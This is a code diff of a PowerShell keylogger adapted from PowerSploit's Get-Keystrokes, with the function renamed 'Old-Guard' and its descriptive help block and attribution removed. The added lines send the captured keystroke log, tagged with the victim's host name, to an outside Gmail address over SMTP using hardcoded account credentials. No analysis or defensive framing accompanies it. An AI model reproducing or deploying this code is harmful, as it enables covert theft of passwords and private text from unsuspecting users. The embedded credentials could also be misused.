@@ -1,31 +1,5 @@
 function Old-Guard {
-<#
-.SYNOPSIS
- 
-    Logs keys pressed, time and the active window.
-    
-    PowerSploit Function: Get-Keystrokes
-    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
-    
-.PARAMETER LogPath
-    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.
-.PARAMETER CollectionInterval
-    Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.
-.PARAMETER PollingInterval
-    Specifies the time in milliseconds to wait between calls to GetAsyncKeyState. Defaults to 40 milliseconds.
-.EXAMPLE
-    Get-Keystrokes -LogPath C:\key.log
-.EXAMPLE
-    Get-Keystrokes -CollectionInterval 20
-.EXAMPLE
-    Get-Keystrokes -PollingInterval 35
-.LINK
-    http://www.obscuresec.com/
-    http://www.exploit-monday.com/
-#>
+
     [CmdletBinding()] Param (
         [Parameter(Position = 0)]
         [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent $_)) -PathType Container})]
@@ -165,12 +139,6 @@ function Old-Guard {
                             $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                             $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                             $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
-                            $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
-                            $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
-                            $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
-                            $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
-                            $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
-                            $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
 
                             if ($LeftShift -or $RightShift) {$LogOutput += '[Shift]'}
                             if ($LeftCtrl  -or $RightCtrl)  {$LogOutput += '[Ctrl]'}
@@ -180,12 +148,6 @@ function Old-Guard {
                             if ($DeleteKey)    {$LogOutput += '[Delete]'}
                             if ($EnterKey)     {$LogOutput += '[Enter]'}
                             if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
-                            if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
-                            if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
-                            if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
-                            if ($DownArrow)    {$LogOutput += '[Down Arrow]'}
-                            if ($LeftMouse)    {$LogOutput += '[Left Mouse]'}
-                            if ($RightMouse)   {$LogOutput += '[Right Mouse]'}
 
                             #check for capslock
                             if ([Console]::CapsLock) {$LogOutput += '[Caps Lock]'}
@@ -201,7 +163,7 @@ function Old-Guard {
                             #convert typed characters
                             if ($UnicodeKey -gt 0) {
                                 $TypedCharacter = $StringBuilder.ToString()
-                                $LogOutput += ('['+ $TypedCharacter +']')
+                                $LogOutput += ('['+  $TypedCharacter  +']')
                             }
 
                             #get the title of the foreground window
@@ -209,7 +171,7 @@ function Old-Guard {
                             $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
 
                             #get the current DTG
-                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
+                            $TimeStamp = (Get-Date -Format dd/MM:HH:mm)
 
                             #Create a custom object to store results
                             $ObjectProperties = @{'Key Typed' = $LogOutput;
@@ -223,6 +185,18 @@ function Old-Guard {
                             #return results
                             Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode
                             Copy-item "$env:TEMP/key.log" -Destination "$env:TEMP/key_final.txt"
+                            
+                            #email results
+                            $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
+                            $SMTPInfo.EnableSsl = $true
+                            $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', 'usedrubberducky')
+                            $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com' 
+                            $ReportEmail.To.Add('warof1846@gmail.com')
+                            $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+                            $ReportEmail.Body = 'Report 001'
+                            $ReportEmail.Attachments.Add('%temp%/key_final.txt')
+                            $SMTPInfo.Send($ReportEmail)
+                            $SMTPInfo.Send($ReportEmail)
 
                         }
                     }
